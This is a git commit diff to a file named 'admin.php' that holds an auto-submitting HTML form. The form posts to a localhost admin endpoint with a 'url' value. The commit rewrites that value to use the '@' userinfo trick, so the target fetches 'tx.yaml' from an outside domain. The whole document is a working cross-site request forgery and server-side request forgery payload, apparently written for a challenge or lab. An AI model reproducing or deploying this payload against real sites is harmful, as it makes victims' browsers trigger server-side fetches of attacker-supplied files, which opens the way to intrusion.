ca26edb138bab456371277d1dfb22910c7b5a9c8
Mohammed Amer <53377619+OldMohamm@users.noreply.github.com>
2025-09-07 16:22:23 +0300

    Update admin.php

--- admin.php
+++ admin.php
@@ -1,4 +1,4 @@
 <form id=f method=POST action="http://localhost:5000/admin.php">
-  <input name="url" value="http://localhost:5000/admin.php@localhost:5000/tx.yaml">
+  <input name="url" value="http://localhost:5000/admin.php@0nlymohammed.com/tx.yaml">
 </form>
 <script>f.submit()</script>
